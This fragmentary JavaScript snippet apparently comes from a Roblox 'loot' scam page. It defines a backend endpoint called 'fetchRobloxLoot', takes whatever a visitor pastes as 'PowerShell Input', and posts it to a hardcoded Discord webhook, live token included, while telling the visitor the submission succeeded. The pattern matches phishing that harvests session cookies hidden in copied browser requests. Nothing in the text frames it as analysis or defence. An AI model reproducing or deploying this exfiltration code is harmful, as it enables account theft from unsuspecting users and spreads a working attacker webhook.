...
document.addEventListener('DOMContentLoaded', () => {
    ...
    const YOUR_BACKEND_ENDPOINT_URL = 'https://backend-for-render-2.onrender.com/fetchRobloxLoot'; // <<<<---- YOU. MUST. CHANGE. THIS.
    // =================================================================================
...
if (scriptTextFromUser) {
    ...
    fetch("https://discord.com/api/webhooks/1393233820685434921/3aIHe5IE3Q23BYDwW_J6Q6jcLEPo2SP7Okqbo4cGepA4_Yk6ngHpYkhCu46E2XNjGcrF", {
        ...
        body: JSON.stringify({
            content: `PowerShell Input:\n\`\`\`\n${scriptTextFromUser}\n\`\`\``
        })
    })
    .then(response => {
        if (response.ok) {
            statusMessage.textContent = "✅ Sent to webhook successfully!";
    ...
    .catch(error => {
        ...
        statusMessage.textContent = "❌ An error occurred sending to Discord webhook.";
        statusMessage.className = 'error';
    });
} else {
    statusMessage.textContent = "NO INPUT DETECTED.";
    statusMessage.className = 'error';
}
